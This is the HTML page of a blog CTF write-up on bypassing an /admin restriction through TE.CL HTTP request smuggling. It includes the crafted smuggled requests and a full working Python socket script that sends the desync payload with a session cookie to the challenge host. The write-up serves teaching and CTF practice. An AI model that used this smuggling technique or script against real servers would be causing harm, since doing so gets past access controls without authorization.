@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Write-up Secrecy-on-demand CTF | Petru Blog</title>
+<meta name="keywords" content="CTF, Security">
+<meta name="description" content="Statement
+This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.
+Tags: bypass, desync, web
+Solution
+From the tags we see desync, so maybe http smuggling could work.
+First, let&rsquo;s check http version:
+&gt; curl -I -v http://23.88.96.97:33079/login
+*   Trying 23.88.96.97:33079...
+* Connected to 23.88.96.97 (23.88.96.97) port 33079
+* using HTTP/1.x
+&gt; HEAD /login HTTP/1.1
+&gt; Host: 23.88.96.97:33079
+&gt; User-Agent: curl/8.15.0
+&gt; Accept: */*
+We are using http/1 requests">
+<meta name="author" content="">
+<link rel="canonical" href="https://petrucodes.ro/posts/ctf-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.674031476e8fa56b2d9b83af1e29d9212990928d02331110af7dcd1370ea2bd9.css" integrity="sha256-Z0AxR26PpWstm4OvHinZISmQko0CMxEQr33NE3DqK9k=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://petrucodes.ro/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://petrucodes.ro/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://petrucodes.ro/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://petrucodes.ro/apple-touch-icon.png">
+<link rel="mask-icon" href="https://petrucodes.ro/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://petrucodes.ro/posts/ctf-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://petrucodes.ro/posts/ctf-writeup/">
+  <meta property="og:site_name" content="Petru Blog">
+  <meta property="og:title" content="Write-up Secrecy-on-demand CTF">
+  <meta property="og:description" content="Statement This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.
+Tags: bypass, desync, web
+Solution From the tags we see desync, so maybe http smuggling could work.
+First, let’s check http version:
+&gt; curl -I -v http://23.88.96.97:33079/login * Trying 23.88.96.97:33079... * Connected to 23.88.96.97 (23.88.96.97) port 33079 * using HTTP/1.x &gt; HEAD /login HTTP/1.1 &gt; Host: 23.88.96.97:33079 &gt; User-Agent: curl/8.15.0 &gt; Accept: */* We are using http/1 requests">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-21T18:49:15+03:00">
+    <meta property="article:modified_time" content="2026-05-21T18:49:15+03:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Security">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Write-up Secrecy-on-demand CTF">
+  <meta name="twitter:description" content="Statement This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.
+Tags: bypass, desync, web
+Solution From the tags we see desync, so maybe http smuggling could work.
+First, let’s check http version:
+&gt; curl -I -v http://23.88.96.97:33079/login * Trying 23.88.96.97:33079... * Connected to 23.88.96.97 (23.88.96.97) port 33079 * using HTTP/1.x &gt; HEAD /login HTTP/1.1 &gt; Host: 23.88.96.97:33079 &gt; User-Agent: curl/8.15.0 &gt; Accept: */* We are using http/1 requests">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://petrucodes.ro/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Write-up Secrecy-on-demand CTF",
+      "item": "https://petrucodes.ro/posts/ctf-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Write-up Secrecy-on-demand CTF",
+  "name": "Write-up Secrecy-on-demand CTF",
+  "description": "Statement This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.\nTags: bypass, desync, web\nSolution From the tags we see desync, so maybe http smuggling could work.\nFirst, let\u0026rsquo;s check http version:\n\u0026gt; curl -I -v http://23.88.96.97:33079/login * Trying 23.88.96.97:33079... * Connected to 23.88.96.97 (23.88.96.97) port 33079 * using HTTP/1.x \u0026gt; HEAD /login HTTP/1.1 \u0026gt; Host: 23.88.96.97:33079 \u0026gt; User-Agent: curl/8.15.0 \u0026gt; Accept: */* We are using http/1 requests\n",
+  "keywords": [
+    "CTF", "Security"
+  ],
+  "articleBody": "Statement This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.\nTags: bypass, desync, web\nSolution From the tags we see desync, so maybe http smuggling could work.\nFirst, let’s check http version:\n\u003e curl -I -v http://23.88.96.97:33079/login * Trying 23.88.96.97:33079... * Connected to 23.88.96.97 (23.88.96.97) port 33079 * using HTTP/1.x \u003e HEAD /login HTTP/1.1 \u003e Host: 23.88.96.97:33079 \u003e User-Agent: curl/8.15.0 \u003e Accept: */* We are using http/1 requests\nSo, there are three types of desync we can exploit:\nCL.TE TE.CL TE.TE Let’s try CL.TE and TE.CL. First I tried CL.TE and I thought I reached the backend and smuggling worked, but unfortunately not. After some time, I tried TE.CL as well and it worked.\nThe first smuggling i tried was:\nGET /admin HTTP/1.1 Host: {HOST}:{PORT}\\r\\n This route give 403 on frontend, but by bypassing gives /login page on the backend smuggled. So, naturally try creating an account on the website and inject the session cookie in the request:\nGET /admin HTTP/1.1 Host: {HOST}:{PORT} Cookie: session_id={MY_COOKIE} After this, I obtained a html containing:\n\u003cdiv class=\"flag-box\"\u003e \u003cp style=\"color:#ccc;margin-bottom:10px;font-size:1.1em\"\u003eCongrats! Keep the secret for yourself!\u003c/p\u003e \u003cspan class=\"flag\"\u003e***************\u003c/span\u003e - Here was the flag. I won't show it here. \u003c/div\u003e For sending requests easily I used this python script.\n# TE.CL import socket import sys HOST = \"23.88.96.97\" PORT = 33085 smuggled = ( f\"GET /admin HTTP/1.1\\r\\n\" f\"Host: {HOST}:{PORT}\\r\\n\" \"Cookie: session_id=7900a9ed466c493a86ea5a962d693889\\r\\n\" \"\\r\\n\" ).encode() chunk_size = hex(len(smuggled))[2:].encode() body = ( chunk_size + b\"\\r\\n\" + smuggled + b\"\\r\\n\" b\"0\\r\\n\\r\\n\" ) request = ( b\"POST /login HTTP/1.1\\r\\n\" b\"Host: \" + f\"{HOST}:{PORT}\".encode() + b\"\\r\\n\" b\"Transfer-Encoding: chunked\\r\\n\" b\"Content-Length: 0\\r\\n\" b\"Connection: keep-alive\\r\\n\" b\"\\r\\n\" + body ) trigger = ( b\"GET / HTTP/1.1\\r\\n\" b\"Host: \" + f\"{HOST}:{PORT}\".encode() + b\"\\r\\n\" b\"Connection: close\\r\\n\" b\"\\r\\n\" ) # standard http with socket.create_connection((HOST, PORT), timeout=10) as sock: sock.settimeout(20) sock.sendall(request) print(\"sending trigger request\", file=sys.stderr) sock.sendall(trigger) response = b\"\" while True: try: chunk = sock.recv(4096) except socket.timeout: print(\"recv timeout\", file=sys.stderr) break if not chunk: print(\"connection closed by server\", file=sys.stderr) break print(f\"received {len(chunk)} bytes\", file=sys.stderr) response += chunk if response: print(response.decode(\"utf-8\", errors=\"replace\")) else: print(\"NO RESPONSE BYTES\") Resources https://portswigger.net/web-security/request-smuggling CTF Source: https://neonctf.ro/ ",
+  "wordCount" : "371",
+  "inLanguage": "en",
+  "datePublished": "2026-05-21T18:49:15+03:00",
+  "dateModified": "2026-05-21T18:49:15+03:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://petrucodes.ro/posts/ctf-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Petru Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://petrucodes.ro/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="https://petrucodes.ro/" accesskey="h" title="Petru Blog (Alt + H)">Petru Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="https://petrucodes.ro/categories/programming/" title="Programming">
+                    <span>Programming</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://petrucodes.ro/categories/misc/" title="Misc">
+                    <span>Misc</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://petrucodes.ro/categories/movie-reviews/" title="Movie Reviews">
+                    <span>Movie Reviews</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://petrucodes.ro/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+    <a href='https://petrucodes.ro/'>Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="https://petrucodes.ro/posts/">Posts</a></nav>
+    <h1 class="post-title entry-hint-parent">
+      Write-up Secrecy-on-demand CTF
+    </h1>
+    <div class="post-meta"><span title='2026-05-21 18:49:15 +0300 EEST'>May 21, 2026</span>&nbsp;·&nbsp;<span>2 min</span>
+
+</div>
+  </header> <details class="toc"  open>
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#statement" aria-label="Statement">Statement</a></li>
+            <li>
+                <a href="#solution" aria-label="Solution">Solution</a></li>
+            <li>
+                <a href="#resources" aria-label="Resources">Resources</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><h1 id="statement">Statement<a hidden class="anchor" aria-hidden="true" href="#statement">#</a></h1>
+<p>This task holds a good-kept secret inside a portal from the app, find it and log in. You can try the most seen things to get it, but you will lose your time. Only the chosen ones will see it.</p>
+<p>Tags: <code>bypass</code>, <code>desync</code>, <code>web</code></p>
+<h1 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h1>
+<p>From the tags we see <code>desync</code>, so maybe http smuggling could work.</p>
+<p>First, let&rsquo;s check http version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; curl -I -v http://23.88.96.97:33079/login
+</span></span><span style="display:flex;"><span>*   Trying 23.88.96.97:33079...
+</span></span><span style="display:flex;"><span>* Connected to 23.88.96.97 <span style="color:#f92672">(</span>23.88.96.97<span style="color:#f92672">)</span> port <span style="color:#ae81ff">33079</span>
+</span></span><span style="display:flex;"><span>* using HTTP/1.x
+</span></span><span style="display:flex;"><span>&gt; HEAD /login HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 23.88.96.97:33079
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/8.15.0
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span></code></pre></div><p>We are using http/1 requests</p>
+<p>So, there are three types of desync we can exploit:</p>
+<ul>
+<li>CL.TE</li>
+<li>TE.CL</li>
+<li>TE.TE</li>
+</ul>
+<p>Let&rsquo;s try CL.TE and TE.CL. First I tried CL.TE and I thought I reached the backend and smuggling worked, but unfortunately not. After some time, I tried TE.CL as well and it worked.</p>
+<p>The first smuggling i tried was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /admin HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: <span style="color:#f92672">{</span>HOST<span style="color:#f92672">}</span>:<span style="color:#f92672">{</span>PORT<span style="color:#f92672">}</span><span style="color:#ae81ff">\r\n</span>
+</span></span></code></pre></div><p>This route give 403 on frontend, but by bypassing gives /login page on the backend smuggled. So, naturally try creating an account on the website and inject the session cookie in the request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /admin HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: <span style="color:#f92672">{</span>HOST<span style="color:#f92672">}</span>:<span style="color:#f92672">{</span>PORT<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>Cookie: session_id<span style="color:#f92672">={</span>MY_COOKIE<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>After this, I obtained a html containing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flag-box&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color:#ccc;margin-bottom:10px;font-size:1.1em&#34;</span>&gt;Congrats! Keep the secret for yourself!&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flag&#34;</span>&gt;***************&lt;/<span style="color:#f92672">span</span>&gt; - Here was the flag. I won&#39;t show it here.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><p>For sending requests easily I used this python script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># TE.CL</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;23.88.96.97&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">33085</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smuggled <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;GET /admin HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>PORT<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Cookie: session_id=7900a9ed466c493a86ea5a962d693889</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_size <span style="color:#f92672">=</span> hex(len(smuggled))[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    chunk_size <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    smuggled <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>request <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;POST /login HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Transfer-Encoding: chunked</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Content-Length: 0</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Connection: keep-alive</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> body
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>trigger <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;GET / HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Host: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>PORT<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Connection: close</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># standard http</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>create_connection((HOST, PORT), timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>) <span style="color:#66d9ef">as</span> sock:
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">20</span>)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>sendall(request)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;sending trigger request&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>    sock<span style="color:#f92672">.</span>sendall(trigger)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            chunk <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;recv timeout&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chunk:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;connection closed by server&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;received </span><span style="color:#e6db74">{</span>len(chunk)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">+=</span> chunk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> response:
+</span></span><span style="display:flex;"><span>    print(response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;replace&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;NO RESPONSE BYTES&#34;</span>)
+</span></span></code></pre></div><h1 id="resources">Resources<a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h1>
+<ul>
+<li><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener noreferrer">
+  https://portswigger.net/web-security/request-smuggling
+</a></li>
+<li>CTF Source: <a href="https://neonctf.ro/" target="_blank" rel="noopener noreferrer">
+  https://neonctf.ro/
+</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://petrucodes.ro/tags/ctf/">CTF</a></li>
+      <li><a href="https://petrucodes.ro/tags/security/">Security</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
